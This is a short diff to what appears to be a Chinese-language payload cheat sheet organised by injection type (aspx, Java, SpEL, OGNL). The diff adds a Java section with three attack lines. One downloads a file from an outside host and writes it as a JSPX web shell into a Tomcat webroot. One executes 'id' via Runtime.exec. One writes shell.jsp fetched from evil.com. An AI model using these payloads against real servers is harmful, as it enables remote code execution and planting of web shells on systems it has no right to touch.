@@ -120,7 +120,13 @@ aspx
 
 ```
 
+# Java 代码块
+```
+new File('./webapps/ROOT/test.jspx') << new URL('http://192.168.43.81:18080/123.txt').text
+Runtime runtime = Runtime.getRuntime(); runtime.exec("id");
+new FileOutputStream("shell.jsp").write(new URL("http://evil.com/shell").openStream());
 
+```
 
 # Spel 表达式注入
 
@@ -134,6 +140,8 @@ T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager)
 
 
 ```
+
+
 
 
 # Ognl 表达式注入
